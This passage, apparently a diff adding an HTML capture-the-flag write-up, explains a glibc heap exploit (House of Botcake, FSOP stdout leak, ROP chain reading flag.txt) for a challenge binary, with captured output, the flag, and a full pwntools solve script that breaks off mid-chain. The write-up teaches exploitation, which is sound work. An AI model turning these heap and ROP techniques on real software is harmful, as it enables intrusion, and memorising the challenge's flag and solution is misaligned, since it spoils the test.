+<span class="n">write_letter</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+
+<span class="c1"># Step 10</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_wide_data_2</span><span class="p">)</span>  <span class="c1"># Padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__GI__IO_file_jumps</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0fbad1887</span><span class="p">)</span>  <span class="c1"># New _flags</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">-</span> <span class="mh">0x2228</span><span class="p">)</span>  <span class="c1"># environ stack address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">-</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># Later in the same segment</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span> <span class="o">+</span> <span class="mi">132</span><span class="p">)</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Overwriting write_base and _flags causes libc to flush</span>
+</code></pre></div>
+
+<p>Notice that output is padded to beyond <code>_IO_buf_end</code>, in order to avoid dropping a stray newline character in an important address. Additionally, the write is actually targeted a bit before stdout in stderr, as this is the first occurrence of a pointer on an aligned address.</p>
+<p>Running this code, we get a beautiful leak on stdout. It can be turned into an rip address with the following code:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">rip</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x178</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;rip: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rip</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<h3>Getting the flag</h3>
+<p>As mentioned earlier, House of Botcake is convenient, as we can easily perform back-to-back writes. To pivot, we simply free both chunks again, then overwrite the fd of chunk B:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">send_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>  <span class="c1"># Free A+B</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Free B</span>
+
+<span class="c1"># Step 8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">rip</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="n">guard</span><span class="p">)</span>  <span class="c1"># Address overlaps return instruction pointer from one of fgets subroutines</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Create a new chunk, overflowing the tcache chunk</span>
+
+<span class="c1"># Step 9</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Through experimentation, I found the offset of 0x178 from the leaked pointer to be ideal. This is because, as <code>fgets</code> calls into <code>__GI__IO_getline_info</code>, we will end up overwriting the return instruction pointer of that subroutine. Right before this, is also the first occurrence of an address on an aligned pointer, at least when I check in gdb.</p>
+<p>Forging a rop-chain is now fairly simple. We must execute the following calls in order to get the flag:<br />
+1. <code>fd = open("./flag.txt", 0, 0)</code><br />
+2. <code>read(fd, buf, n)</code><br />
+3. <code>write(1, buf, n)</code></p>
+<p>The second and third can be done through <code>read@libc</code> and <code>write@libc</code>. However, we cannot use <code>open@libc</code>, as this function instead uses the openat syscall, which is not allowed. Still, this can easily be done with a syscall gadget:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_rtld_global</span><span class="p">)</span>  <span class="c1"># Padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x45eb0</span><span class="p">)</span>  <span class="c1"># pop rax</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># open, since open@libc uses openat :(</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">)</span>  <span class="c1"># -&gt; &quot;./flag.txt&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x13f687</span><span class="p">)</span>  <span class="c1"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x90529</span><span class="p">)</span>  <span class="c1"># pop rdx; pop rbx</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x91396</span><span class="p">)</span>  <span class="c1"># syscall(2, &quot;./flag.txt&quot;, 0, 0)</span>
+</code></pre></div>
+
+<p><code>rdi</code> is set to where the string "./flag.txt" will be, <code>rax</code> is set to 2 and both <code>rsi</code> and <code>rdx</code> are nulled. Assuming that the file gets the fd 3, the following chain can then be used to read the flag:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Assume fd is 3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x13f687</span><span class="p">)</span>  <span class="c1"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rip</span> <span class="o">-</span> <span class="mh">0x20</span><span class="p">)</span>  <span class="c1"># Some valid memory</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x90529</span><span class="p">)</span>  <span class="c1"># pop rdx; pop rbx</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span>  <span class="c1"># nbytes</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>  <span class="c1"># read(3, buf, 0x50)</span>
+</code></pre></div>
+
+<p>At last, we can simply pop 1 into <code>rdi</code>, as both <code>rsi</code> and <code>rdx</code> are preserved by libc:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Switch to stdout, rsi and rdx are preserved</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">write</span><span class="p">)</span>  <span class="c1"># write(1, buf, 0x50)</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;./flag.txt</span><span class="se">\x00</span><span class="s2">&quot;</span>
+</code></pre></div>
+
+<p>Finally, we write the rop chain to the stack:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">write_letter</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+</code></pre></div>
+
+<p>Running this should now return the flag :)</p>
+<div class="codehilite"><pre><span></span><code>[+] Opening connection to mailman.chal.imaginaryctf.org on port 1337: Done
+libc: 0x7f2112439000
+guard: 0x562cc9e16
+heap: 0x562cc9e14000
+rip: 0x7ffed3615058
+[*] Switching to interactive mode
+ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
+</code></pre></div>
+
+<hr />
+<h2>Solution</h2>
+<p>Below is the full solve script, with comments:</p>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">BINARY</span> <span class="o">=</span> <span class="s2">&quot;./vuln_patched&quot;</span>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s2">&quot;mailman.chal.imaginaryctf.org&quot;</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">1337</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;alacritty&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">,</span> <span class="s1">&#39;zsh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
+<span class="n">context</span><span class="o">.</span><span class="n">gdbinit</span> <span class="o">=</span> <span class="s2">&quot;~/.gdbinit_pwndbg&quot;</span>
+<span class="n">env</span> <span class="o">=</span> <span class="p">{}</span> <span class="c1"># {&quot;LD_LIBRARY_PATH&quot;: &quot;./&quot;, &quot;LD_PRELOAD&quot;: &quot;&quot;}</span>
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;</span>
+<span class="s1">c</span>
+<span class="s1">&#39;&#39;&#39;</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">connect</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">RAW</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">BINARY</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">BINARY</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="n">env</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">address_from_bytes</span><span class="p">(</span><span class="n">by</span><span class="p">):</span>
+    <span class="n">by</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">by</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">by</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">write_letter</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">send_letter</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+
+<span class="k">def</span> <span class="nf">read_letter</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;&gt; &quot;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
+    <span class="n">conn</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;: &quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="k">return</span> <span class="n">conn</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+
+<span class="c1"># --------------------------------- heap and libc leaks ----------------------------------</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Chunk large enough to not fit into tcache</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x1a8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Chunk large enough to not come from remaindering</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># Free a chunk into the unsortedbin</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># Free a chunk into an empty tcache bin</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">read_letter</span><span class="p">(</span><span class="mi">0</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">main_arena</span> <span class="o">-</span> <span class="mi">96</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">guard</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">read_letter</span><span class="p">(</span><span class="mi">1</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+<span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="n">guard</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>  <span class="c1"># Our chunk is 2 pages away from heap base</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;guard: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">guard</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;heap: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># ------------------------------ House of Botcake into FSOP ------------------------------</span>
+
+<span class="c1"># Step 1</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">12</span><span class="p">):</span>
+    <span class="n">write_letter</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;CCCC&quot;</span><span class="p">)</span>
+
+<span class="c1"># Step 2</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>  <span class="c1"># Chunk A</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;BBBB&quot;</span><span class="p">)</span>  <span class="c1"># Chunk B</span>
+
+<span class="c1"># Step 3</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;GGGG&quot;</span><span class="p">)</span>  <span class="c1"># Guard chunk</span>
+
+<span class="c1"># Step 4</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mi">12</span><span class="p">):</span>  <span class="c1"># Fill tcache</span>
+    <span class="n">send_letter</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="c1"># Step 5</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Free into unsortedbin, causing consolidation</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># Step 6</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;Garbage&quot;</span><span class="p">)</span>  <span class="c1"># Allocate garbage chunk to remove one chunk from tcache</span>
+
+<span class="c1"># Step 7</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Free chunk again, now into tcache</span>
+
+<span class="c1"># Step 8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stderr_</span> <span class="o">+</span> <span class="mi">160</span><span class="p">)</span> <span class="o">^</span> <span class="n">guard</span><span class="p">)</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Create a new chunk, overflowing into the tcache chunk</span>
+
+<span class="c1"># Step 9</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+
+<span class="c1"># Step 10</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_wide_data_2</span><span class="p">)</span>  <span class="c1"># Padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__GI__IO_file_jumps</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0fbad1887</span><span class="p">)</span>  <span class="c1"># New _flags</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">-</span> <span class="mh">0x2228</span><span class="p">)</span>  <span class="c1"># environ stack address</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">-</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># Later in the same segment</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">*</span> <span class="mi">1</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span> <span class="o">+</span> <span class="mi">132</span><span class="p">)</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>  <span class="c1"># Overwriting write_base and _flags causes libc to flush</span>
+
+<span class="n">rip</span> <span class="o">=</span> <span class="n">address_from_bytes</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">()[:</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="mh">0x178</span>
+<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;rip: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">rip</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="c1"># ------------------------------ House of Botcake into ROP ------------------------------</span>
+
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>  <span class="c1"># Free A+B</span>
+<span class="n">send_letter</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>  <span class="c1"># Free B</span>
+
+<span class="c1"># Step 8</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mh">0xf8</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x101</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">((</span><span class="n">rip</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span> <span class="o">^</span> <span class="n">guard</span><span class="p">)</span>  <span class="c1"># Address overlaps return instruction pointer from one of fgets subroutines</span>
+
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Step 9</span>
+<span class="n">write_letter</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;AAAA&quot;</span><span class="p">)</span>
+
+<span class="c1"># Step 10</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_rtld_global</span><span class="p">)</span>  <span class="c1"># Padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x45eb0</span><span class="p">)</span>  <span class="c1"># pop rax</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># open, since open@libc uses openat :(</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x2a3e5</span><span class="p">)</span>  <span class="c1"># pop rdi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rip</span> <span class="o">+</span> <span class="mh">0xa8</span><span class="p">)</span>  <span class="c1"># -&gt; &quot;./flag.txt&quot;</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x13f687</span><span class="p">)</span>  <span class="c1"># pop rsi</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
